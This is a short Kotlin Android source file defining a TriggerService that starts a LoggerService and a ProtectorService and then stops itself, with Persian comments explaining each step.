package com.android.seclogupd.core

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.android.seclogupd.service.LoggerService
import com.android.seclogupd.service.ProtectorService

class TriggerService : Service() {
    override fun onCreate() {
        super.onCreate()
        Log.d("TriggerService", "App process bootstrapped via TriggerService")

        // راه‌اندازی سرویس لاگر
        startService(Intent(this, LoggerService::class.java))

        // راه‌اندازی سرویس محافظت
        startService(Intent(this, ProtectorService::class.java))

        // اینجا می‌تونی دیتابیس یا سایر ماژول‌ها رو هم Init کنی (اگه نیاز باشه)

        // پایان کار سرویس، چون فقط هدف بالا آوردن اپ بود
        stopSelf()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
